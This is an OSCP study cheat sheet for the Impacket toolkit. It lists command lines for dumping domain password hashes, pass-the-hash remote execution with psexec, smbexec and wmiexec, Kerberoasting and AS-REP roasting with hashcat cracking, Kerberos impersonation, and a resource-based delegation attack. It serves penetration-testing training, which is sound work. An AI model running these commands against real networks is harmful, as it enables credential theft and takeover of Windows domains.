[AD impacket md 36f15bd2d16c81698005e9280ef81527.md](https://github.com/user-attachments/files/28387828/AD.impacket.md.36f15bd2d16c81698005e9280ef81527.md)
# AD/impacket.md

# Impacket — Network Tools Suite

> Impacket is the main suite to interact with Windows/AD protocols from Linux. Essential for the OSCP.
> 

---

## Install

```bash
pip install impacket --break-system-packages
# Or from repo:
git clone https://github.com/fortra/impacket.git
cd impacket && pip install .
```

---

## secretsdump — Hash dump

```bash
# Full remote dump
impacket-secretsdump domain/user:'password'@<IP>

# Only NTLM hashes from the DC
impacket-secretsdump domain/user:'password'@<IP> -just-dc-ntlm

# With NTLM hash (PTH)
impacket-secretsdump administrator@<IP> -hashes :<NTLM_HASH>

# Local (with SAM and SYSTEM files)
impacket-secretsdump -sam sam.bak -system system.bak LOCAL

# Local with ntds.dit
impacket-secretsdump -ntds ntds.dit -system system.bak LOCAL
```

---

## psexec / smbexec / wmiexec — Remote execution

```bash
# psexec with password
impacket-psexec domain/Administrator:'password'@<IP>

# psexec with hash (PTH)
impacket-psexec administrator@<IP> -hashes :<NTLM_HASH>

# smbexec (more stealthy)
impacket-smbexec domain/user:'password'@<IP>

# wmiexec
impacket-wmiexec domain/Administrator@<IP> -hashes :<NTLM_HASH>
```

---

## GetUserSPNs — Kerberoasting

```bash
# List Kerberoastable service accounts
impacket-GetUserSPNs domain/user:'password' -dc-ip <DC-IP>

# Request tickets (TGS) to crack
impacket-GetUserSPNs domain/user:'password' -dc-ip <DC-IP> -request

# Output to file
impacket-GetUserSPNs domain/user:'password' -dc-ip <DC-IP> -request -outputfile kerberoast.txt

# Crack
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
```

---

## GetNPUsers — AS-REP Roasting

```bash
# With user list (no credentials needed)
impacket-GetNPUsers domain/ -usersfile users.txt -no-pass -dc-ip <IP>

# For a specific user
impacket-GetNPUsers domain/username -no-pass -dc-ip <IP>

# Crack
hashcat -m 18200 asrep_hash.txt /usr/share/wordlists/rockyou.txt
```

---

## getTGT / getST — Kerberos tickets

```bash
# Get TGT
impacket-getTGT domain/user:'password' -dc-ip <IP>
export KRB5CCNAME=user.ccache

# Use the ticket
impacket-psexec -k -no-pass domain/user@target
impacket-secretsdump -k -no-pass domain/user@<DC-IP>

# S4U — impersonate a user
impacket-getST -spn cifs/target.domain.local -impersonate Administrator \
  -dc-ip <IP> domain/service_account -hashes :<NTLM>
export KRB5CCNAME=Administrator.ccache
```

---

## Other useful commands

```bash
# SMB client
impacket-smbclient domain/user:'password'@<IP>

# LDAP / AD enumeration
impacket-ldapdomaindump ldaps://<DC-IP> -u 'domain\user' -p 'password'

# MSSQL
impacket-mssqlclient domain/user:'password'@<IP> -windows-auth

# RPC
impacket-rpcdump @<IP>
impacket-lookupsid domain/user:'password'@<IP>

# RBCD attack
impacket-addcomputer domain/user:'password' -dc-ip <IP> \
  -computer-name 'FAKEPC$' -computer-pass 'Password123'
impacket-rbcd -delegate-from 'FAKEPC$' -delegate-to 'target$' \
  -action write -dc-ip <IP> domain/user:'password'

# SMB server
impacket-smbserver smbFolder $(pwd) -smb2support
impacket-smbserver smbFolder $(pwd) -smb2support -username user -password pass
```
